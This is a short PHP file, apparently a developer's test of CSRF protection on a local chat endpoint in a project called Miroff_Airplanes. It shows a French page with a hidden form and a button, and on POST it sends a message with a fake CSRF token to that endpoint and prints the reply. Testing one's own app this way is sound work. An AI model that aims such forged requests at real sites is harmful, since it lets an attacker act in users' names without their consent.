<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $victim_site = 'http://localhost/Miroff_Airplanes/composants/chat/send_msg.php';
    $csrf_payload = [
        'texte' => 'CSRF attack test message',
        'csrf_token' => 'fake_csrf_token'
    ];

    $options = [
        'http' => [
            'header' => "Content-Type: application/json\r\n",
            'method' => 'POST',
            'content' => json_encode($csrf_payload)
        ]
    ];

    $context = stream_context_create($options);
    $response = file_get_contents($victim_site, false, $context);

    if ($response === false) {
        echo "Échec de l'attaque CSRF, renvoie une erreur.";
    } else {
        echo "Réponse de la simulation de l'attaque CSRF: ";
        echo htmlspecialchars($response);
    }
} else {
    ?>
    <!DOCTYPE html>
    <html lang="fr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Test d'attaque CSRF</title>
    </head>
    <body>
    <h1>Test d'attaque CSRF</h1>
    <button onclick="document.forms[0].submit();">Clique ici</button>
    <form action="" method="POST">
        <input type="hidden" name="texte" value="CSRF attack test message">
        <input type="hidden" name="csrf_token" value="fake_csrf_token">
    </form>
    </body>
    </html>
    <?php
}
?>
